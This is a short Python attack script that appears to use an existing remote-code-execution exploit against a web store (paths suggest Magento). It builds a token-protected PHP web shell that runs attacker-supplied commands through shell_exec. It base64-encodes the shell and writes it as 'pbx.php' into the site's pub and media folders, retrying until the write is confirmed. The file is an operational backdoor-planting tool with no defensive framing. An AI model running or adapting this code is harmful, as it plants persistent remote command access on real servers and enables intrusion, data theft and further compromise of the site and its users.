import base64,os,secrets,sys,time
R="/home/gabri/.hermes/dionysus-pi/workspace-root"
sys.path.insert(0,f"{R}/work/recon/mag")
for v in ("http_proxy","https_proxy","HTTP_PROXY","HTTPS_PROXY"): os.environ.pop(v,None)
import runbig as RB   # already patches exploit req wrapper + IMPERSONATE
TOK=open(f"{R}/work/qpfactory/shell_token.txt").read().strip()
WS=("<?php $K='"+TOK+"';if((string)($_REQUEST['k']??'')!==$K){http_response_code(404);exit('nf');}"
    "$b=(string)($_REQUEST['b']??'');@set_time_limit(300);header('Content-Type: text/plain');"
    "echo \"#RC\\n\";echo @shell_exec($b);echo \"\\n#END\\n\";}")
B64=base64.b64encode(WS.encode()).decode()
targets=["/var/www/html/pub/pbx.php","/var/www/html/media/pbx.php"]
print("[C] start",flush=True)
for rnd in range(8):
    tg=targets[rnd%len(targets)]
    php=f"$d=base64_decode('{B64}');file_put_contents('{tg}',$d);clearstatcache();echo 'CW '.filesize('{tg}').' '.md5_file('{tg}');"
    t0=time.time()
    try:
        out=str(RB.run_big(php))
        print(f"[C{rnd}] {int(time.time()-t0)}s :: {out[:200]}",flush=True)
        if "CW " in out: 
            open(f"{R}/work/qpfactory/C_WROTE_{rnd}.txt","w").write(out); break
    except Exception as ex:
        print(f"[C{rnd}] ERR {type(ex).__name__}:{str(ex)[:90]} ({int(time.time()-t0)}s)",flush=True)
    time.sleep(3)
print("[C] done",flush=True)
